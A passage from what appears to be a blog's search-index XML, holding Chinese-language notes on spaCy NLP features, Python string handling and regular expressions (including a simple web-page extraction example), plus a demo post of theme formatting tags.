class="hljs-keyword">else</span> token.ent_iob_) <span class="hljs-keyword">for</span> token <span class="hljs-keyword">in</span> doc<br>]<br><br>ent_iob = [(token.ent_iob_, token.ent_type_) <span class="hljs-keyword">for</span> token <span class="hljs-keyword">in</span> doc]<br><br><br><span class="hljs-keyword">from</span> nltk.chunk <span class="hljs-keyword">import</span> conlltags2tree<br><span class="hljs-comment"># 按照nltk.Tree的格式显示</span><br>print(conlltags2tree(iob_tagged))<br></code></pre></div></td></tr></table></figure><p>​ 可视化</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> spacy import displacy<br><br>displacy.render(doc, <span class="hljs-attribute">style</span>=<span class="hljs-string">'ent'</span>, <span class="hljs-attribute">jupyter</span>=<span class="hljs-literal">True</span>)<br><br>displacy.render(doc, <span class="hljs-attribute">style</span>=<span class="hljs-string">'dep'</span>, <span class="hljs-attribute">jupyter</span>=<span class="hljs-literal">True</span>)<br></code></pre></div></td></tr></table></figure><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1/image-20200224173728775.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h4><span id="chunking组块分析">chunking/组块分析</span></h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> doc.noun_chunks:<br>    print(chunk.text,<span class="hljs-string">'---'</span>, chunk.label_,<span class="hljs-string">'---'</span>,  chunk.root.text)<br></code></pre></div></td></tr></table></figure><h4><span id="句法依存">句法依存</span></h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> token <span class="hljs-keyword">in</span> doc:<br>    print(<span class="hljs-string">"&#123;0&#125;/&#123;1&#125; &lt;--&#123;2&#125;-- &#123;3&#125;/&#123;4&#125;"</span>.format(<br>        token.text, token.tag_, token.dep_, token.head.text, token.head.tag_))  <span class="hljs-comment">#head</span><br>    <br>displacy.render(doc, style=<span class="hljs-string">'dep'</span>, jupyter=<span class="hljs-literal">True</span>, options=&#123;<span class="hljs-string">'distance'</span>: <span class="hljs-number">90</span>&#125;)<br></code></pre></div></td></tr></table></figure><h4><span id="词向量">词向量</span></h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 如果要使用英文的词向量，需要先下载预先训练好的结果</span><br><span class="hljs-comment"># !python -m spacy download en_core_web_lg</span><br><br>nlp = spacy.load(<span class="hljs-string">'en_core_web_lg'</span>)<br>print(nlp.vocab[<span class="hljs-string">'banana'</span>].vector)<br><br><br><span class="hljs-comment"># 在词向量的基础上，spaCy提供了从词到文档的相似度计算的方法</span><br>target = nlp(<span class="hljs-string">"Cats are beautiful animals."</span>)<br> <br>doc1 = nlp(<span class="hljs-string">"Dogs are awesome."</span>)<br>doc2 = nlp(<span class="hljs-string">"Some gorgeous creatures are felines."</span>)<br>doc3 = nlp(<span class="hljs-string">"Dolphins are swimming mammals."</span>)<br> <br>print(target.similarity(doc1))  <span class="hljs-comment"># 0.8901765218466683</span><br>print(target.similarity(doc2))  <span class="hljs-comment"># 0.9115828449161616</span><br>print(target.similarity(doc3))  <span class="hljs-comment"># 0.7822956752876101</span><br></code></pre></div></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> english process </tag>
            
            <tag> nltk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用python文本处理函数</title>
      <link href="/posts/9ad55c64.html"/>
      <url>/posts/9ad55c64.html</url>
      
        <content type="html"><![CDATA[<h2><span id="python函数">python函数</span></h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 去空格及特殊符号  </span><br>en_str.strip().lstrip().rstrip(<span class="hljs-string">','</span>) <br><br><span class="hljs-comment"># 字符串替换</span><br>en_str.replace(<span class="hljs-string">'hello'</span>, <span class="hljs-string">'hi'</span>)<br><br><span class="hljs-comment"># 删除</span><br>zh_str.strip().replace(<span class="hljs-string">'大家好，'</span>, <span class="hljs-string">''</span>)<br><br><span class="hljs-comment"># 通过join的方式连接</span><br><span class="hljs-string">"，"</span>.join(strs)<br>或者<br>str1+str2<br><br><br><span class="hljs-comment"># 通过split的方式切分</span><br>tmp_str.split(<span class="hljs-string">"；"</span>)<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 以字母序排列，注意是以返回值形态返回排序结果，不改变原list</span><br>sorted(en_strs)<br><br>sorted(en_strs, key=<span class="hljs-keyword">lambda</span> x:x[<span class="hljs-number">2</span>].lower())<br><br><br><span class="hljs-comment"># 查找可以用index和find</span><br>zh_str.index(<span class="hljs-string">"陆超"</span>)   <span class="hljs-comment"># 第一个index</span><br><br>zh_str.find(<span class="hljs-string">"来了老弟"</span>)   <span class="hljs-comment"># 返回-1，不会报错</span><br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 大小写与其他变化</span><br>en_str.title()<br><br>a = en_str.translate(en_str)<br><br>en_str.lower().upper()<br><br>en_str.capitalize()  <span class="hljs-comment"># capitalize</span><br></code></pre></div></td></tr></table></figure><p>函数帮助（help(func)）</p><h2><span id="正则表达式">正则表达式</span></h2><p>正则表达式是<strong>处理字符串</strong>的强大工具，拥有独特的语法和独立的处理引擎。http://regexr.com/</p><p>https://alf.nu/RegexGolf 练习地址</p><h4><span id="re模块">re模块</span></h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># encoding: UTF-8</span><br><span class="hljs-keyword">import</span> re<br> <br><span class="hljs-comment"># 将正则表达式编译成Pattern对象</span><br>pattern = re.compile(<span class="hljs-string">r'hello.*\!'</span>)<br> <br><span class="hljs-comment"># 使用Pattern匹配文本，获得匹配结果，无法匹配时将返回None</span><br>match = pattern.match(<span class="hljs-string">'hello, hanxiaoyang! How are you?'</span>)<br><span class="hljs-comment"># match从头开始匹配</span><br> <br><span class="hljs-keyword">if</span> match:<br>    <span class="hljs-comment"># 使用Match获得分组信息</span><br>    <span class="hljs-keyword">print</span> match.group()<br></code></pre></div></td></tr></table></figure><p>​ <strong>re.compile('pattern', re.I | re.M)</strong>：re.I(re.IGNORECASE): 忽略大小写（括号内是完整写法，下同）re.M(MULTILINE): 多行模式，改变'^'和'$'的行为。</p><p>​<strong>Match</strong>对象是一次匹配的结果，包含了很多关于此次匹配的信息，可以使用Match提供的可读属性或方法来获取这些信息</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">re.match<br></code></pre></div></td></tr></table></figure><p>​<strong>Pattern</strong>对象是一个编译好的正则表达式，通过Pattern提供的一系列方法可以对文本进行匹配查找。</p><p>​<strong>Pattern</strong>不能直接实例化，必须使用re.compile()进行构造。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Pattern提供了几个可读属性用于获取表达式的相关信息：</span><br><span class="hljs-comment">#   pattern: 编译时用的表达式字符串。</span><br><span class="hljs-comment">#   flags: 编译时用的匹配模式。数字形式。</span><br><span class="hljs-comment">#   groups: 表达式中分组的数量。</span><br><span class="hljs-comment">#   groupindex: 以表达式中有别名的组的别名为键、以该组对应的编号为值的字典，没有别名的组不包含在内。</span><br><br><span class="hljs-comment"># re.S(DOTALL): 点任意匹配模式</span><br>re.compile(<span class="hljs-string">r'(\w+) (\w+)(?P&lt;sign&gt;.*)'</span>, re.DOTALL)<br></code></pre></div></td></tr></table></figure><h4><span id="使用pattern">使用pattern</span></h4><ol type="1"><li><p><strong>match(string[, pos[, endpos]]) | re.match(pattern,string[, flags])</strong>:</p><p><strong>这个方法将从string的pos下标处起尝试匹配pattern</strong></p></li></ol><ul><li>如果pattern结束时仍可匹配，则返回一个Match对象</li><li>如果匹配过程中pattern无法匹配，或者匹配未结束就已到达endpos，则返回None。</li><li>pos和endpos的默认值分别为0和len(string)。<strong>注意：这个方法并不是完全匹配。当pattern结束时若string还有剩余字符，仍然视为成功。想要完全匹配，可以在表达式末尾加上边界匹配符'$'。</strong></li></ul><ol start="2" type="1"><li><p><strong>search(string[, pos[, endpos]]) | re.search(pattern,string[, flags])</strong>:</p><p><strong>这个方法从string的pos下标处起尝试匹配pattern</strong></p></li><li><p>sub(repl, string[, count]) | <strong>re.sub(pattern, repl,string[, count])</strong>:</p><ul><li>使用repl替换string中每一个匹配的子串后返回替换后的字符串。<ul><li>当repl是一个字符串时，可以使用、，但不能使用编号0。</li><li>当repl是一个方法时，这个方法应当只接受一个参数（Match对象），并返回一个字符串用于替换（返回的字符串中不能再引用分组）。count用于指定最多替换次数，不指定时全部替换。</li></ul></li></ul></li><li><p>split(string[, maxsplit]) | re.split(pattern, string[,maxsplit]): 按照能够匹配的子串将string分割后返回列表。maxsplit用于指定最大分割次数，不指定将全部分割。</p></li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">p = re.compile(<span class="hljs-string">r'\d+'</span>)<br>print(p.split(<span class="hljs-string">'one1two2three3four4'</span>))<br></code></pre></div></td></tr></table></figure><ol start="5" type="1"><li>findall(string[, pos[, endpos]]) | re.findall(pattern, string[,flags]):搜索string，<strong>以列表形式返回全部能匹配的子串</strong>。</li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">p = re.compile(<span class="hljs-string">r'\d+'</span>)<br>print(p.findall(<span class="hljs-string">'one1two2three3four4'</span>)<br></code></pre></div></td></tr></table></figure><ol start="6" type="1"><li>finditer(string[, pos[, endpos]]) | <strong>re.finditer(pattern,string[, flags])</strong>:搜索string，返回一个顺序访问每一个匹配结果（Match对象）的迭代器。</li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">p = re.compile(<span class="hljs-string">r'\d+'</span>)<br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> p.finditer(<span class="hljs-string">'one1two2three3four4'</span>):<br>print(m.group())<br></code></pre></div></td></tr></table></figure><ol start="7" type="1"><li><p><strong>subn(repl, string[, count]) |re.subn(pattern, repl,string[, count]): </strong></p><p>返回 (sub(repl, string[, count]), 替换次数)。</p></li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">p = re.compile(<span class="hljs-string">r'(\w+) (\w+)'</span>)<br>s = <span class="hljs-string">'i say, hello world!'</span><br> <br>print(p.subn(<span class="hljs-string">r'\2 \1'</span>, s))<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(m)</span>:</span><br>    <span class="hljs-keyword">return</span> m.group(<span class="hljs-number">1</span>).title() + <span class="hljs-string">' '</span> + m.group(<span class="hljs-number">2</span>).title()<br> <br>print(p.subn(func, s))<br></code></pre></div></td></tr></table></figure><h4><span id="词条和解释抽取">词条和解释抽取</span></h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 引入爬虫工具库</span><br><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> rq<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># 发送请求</span><br>page = rq.get(<span class="hljs-string">"https://baike.sogou.com/v231013.htm"</span>)<br><br><span class="hljs-comment"># 返回状态码正常</span><br>page.status_code<br><br><span class="hljs-comment"># 词条正则表达式抽取</span><br>title_pattern = re.compile(<span class="hljs-string">r'&lt;h1 id="title".*?&gt;(.*?)&lt;/h1&gt;'</span>) <br>title = title_pattern.search(page.text) <br>print(title.group(<span class="hljs-number">1</span>))<br><br><span class="hljs-comment"># 词条正则表达式抽取</span><br>content_pattern = re.compile(<span class="hljs-string">r'&lt;p&gt;(.*?)&lt;\\/p&gt;'</span>) <br>contents = content_pattern.findall(page.text) <br>print(contents)<br><br><br>list(map(<span class="hljs-keyword">lambda</span> x:re.sub(<span class="hljs-string">"&lt;a .*?&gt;|&lt;\\\/[ab]&gt;"</span>, <span class="hljs-string">""</span>,x), contents))<br></code></pre></div></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> regex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hello</title>
      <link href="/posts/3610a686.html"/>
      <url>/posts/3610a686.html</url>
      
        <content type="html"><![CDATA[<p>便签</p><p>可选便签：</p><figure class="highlight subunit"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs subunit">primary<br><br>secondary<br><br>success<br><br>danger<br><br>warning<br><br>info<br><br>light<br></code></pre></div></td></tr></table></figure><div class="note note-success">            <p>Hello World.</p>          </div><p class="note note-primary">Hello World.</p><span class="label label-primary 行内标签"></span><p><span class="label label-primary">行内标签</span></p><p>勾选框</p><div>            <input type="checkbox" disabled>普通示例          </div><div>            <input type="checkbox" disabled checked="checked">默认选中          </div>            <input type="checkbox" disabled>内联示例          <p>后面文字不换行</p><input type="checkbox" disabled><p>也可以只传入一个参数，文字写在后边（这样不支持外联）</p><p>按钮</p><p>url：跳转链接 text：显示的文字title：鼠标悬停时显示的文字（可选）</p><a class="btn" href="url" title="title" target="_blank">text</a><p><a class="btn" href="url" title="title">text</a></p><p>组图</p><p>total：图片总数量，对应中间包含的图片 url 数量n1-n2-...：每行的图片数量，可以省略，默认单行最多 3 张图，求和必须相等于total，否则按默认样式</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="url" srcset="/img/loading.gif" lazyload></div><div class="group-image-wrap"><img src="url" srcset="/img/loading.gif" lazyload></div><div class="group-image-wrap"><img src="url" srcset="/img/loading.gif" lazyload></div></div><div class="group-image-row"><div class="group-image-wrap"><img src="url" srcset="/img/loading.gif" lazyload></div><div class="group-image-wrap"><img src="url" srcset="/img/loading.gif" lazyload></div></div></div><p>Mermaid 流程图</p><p><code>mermaid: true</code> 才会在文章页启动流程图渲染</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
